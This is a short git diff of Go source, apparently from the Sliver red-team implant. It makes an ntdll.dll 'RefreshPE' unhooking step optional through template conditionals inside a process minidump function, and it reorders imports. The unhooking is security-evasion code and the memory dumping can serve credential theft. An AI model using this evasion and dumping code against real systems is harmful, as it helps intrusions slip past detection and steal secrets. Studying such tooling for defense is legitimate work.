@@ -26,13 +26,16 @@ import (
 	"log"
 	//{{end}}
 
+	// {{if .Evasion}}
 	// {{if eq .GOARCH "amd64"}}
 	"github.com/bishopfox/sliver/sliver/evasion"
 	// {{end}}
-	"github.com/bishopfox/sliver/sliver/syscalls"
-	"github.com/bishopfox/sliver/sliver/priv"
-	"golang.org/x/sys/windows"
+	// {{end}}
 	"os"
+
+	"github.com/bishopfox/sliver/sliver/priv"
+	"github.com/bishopfox/sliver/sliver/syscalls"
+	"golang.org/x/sys/windows"
 )
 
 const (
@@ -67,6 +70,7 @@ func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
 	dump := &WindowsDump{}
 	// {{if eq .GOARCH "amd64"}}
 	// Hotfix for #66 - need to dig deeper
+	// {{if .Evasion}}
 	err := evasion.RefreshPE(`c:\windows\system32\ntdll.dll`)
 	if err != nil {
 		//{{if .Debug}}
@@ -74,6 +78,7 @@ func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
 		//{{end}}
 		return dump, err
 	}
+	// {{end}}
 	// {{end}}
 	// TODO: find a better place to store the dump file
 	f, err := ioutil.TempFile("", "")
